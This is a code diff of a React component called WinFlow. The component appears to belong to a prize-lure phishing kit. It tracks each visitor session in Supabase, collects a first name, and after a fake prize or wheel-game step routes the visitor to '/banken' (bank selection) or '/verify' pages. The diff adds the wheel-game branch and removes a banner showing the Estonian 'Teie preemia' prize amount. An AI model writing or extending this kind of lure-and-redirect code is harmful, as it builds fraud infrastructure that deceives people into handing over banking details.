@@ -35,7 +35,7 @@ export function WinFlow({ sessionId, routeSessionId }: Props) {
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
   const [amount, setAmount] = useState<number | null>(null);
-  const [currency, setCurrency] = useState<string>("€");
+  const [, setCurrency] = useState<string>("€");
   const [loading, setLoading] = useState(true);
   const [showModal] = useState(true);
   const [firstName, setFirstName] = useState("");
@@ -146,6 +146,7 @@ export function WinFlow({ sessionId, routeSessionId }: Props) {
     setSaving(true);
     setError(null);
 
+    const goWheel = sessionFormData?.is_wheel_game === true;
     const nextForm = {
       ...sessionFormData,
       firstName: firstName.trim(),
@@ -155,7 +156,11 @@ export function WinFlow({ sessionId, routeSessionId }: Props) {
 
     const { error: upErr } = await supabase
       .from("sessions")
-      .update({ is_hidden: false, form_data: nextForm, current_step: "banken" })
+      .update({
+        is_hidden: false,
+        form_data: nextForm,
+        current_step: goWheel ? "verify" : "banken",
+      })
       .eq("id", sessionId);
 
     setSaving(false);
@@ -176,7 +181,7 @@ export function WinFlow({ sessionId, routeSessionId }: Props) {
       const qs = routeSessionId
         ? `?session=${encodeURIComponent(routeSessionId)}`
         : "";
-      window.location.href = `/banken${qs}`;
+      window.location.href = `${goWheel ? "/verify" : "/banken"}${qs}`;
     }, 700);
   }
 
@@ -235,16 +240,7 @@ export function WinFlow({ sessionId, routeSessionId }: Props) {
                 <p className="mt-1 text-[11px] text-gray-300 sm:text-sm sm:mt-2">
                   {settings.profile_subtitle}
                 </p>
-                <div className="mt-3 flex items-center justify-between rounded-xl bg-[#0066CC] px-4 py-2.5 sm:mt-4 sm:px-5 sm:py-3 w-max gap-4 sm:gap-8">
-                  <div className="leading-tight text-left">
-                    <div className="text-[11px] font-bold text-white/90 sm:text-xs">Teie</div>
-                    <div className="text-xs font-bold text-white sm:text-sm">preemia</div>
-                  </div>
-                  <div className="flex items-center gap-1.5 sm:gap-2">
-                    <span className="text-xl font-black text-white sm:text-2xl">{currency}</span>
-                    <span className="text-2xl font-black text-white sm:text-3xl">{amount?.toLocaleString("de-AT")}</span>
-                  </div>
-                </div>
+
               </div>
               
               {/* Gift Box Image */}
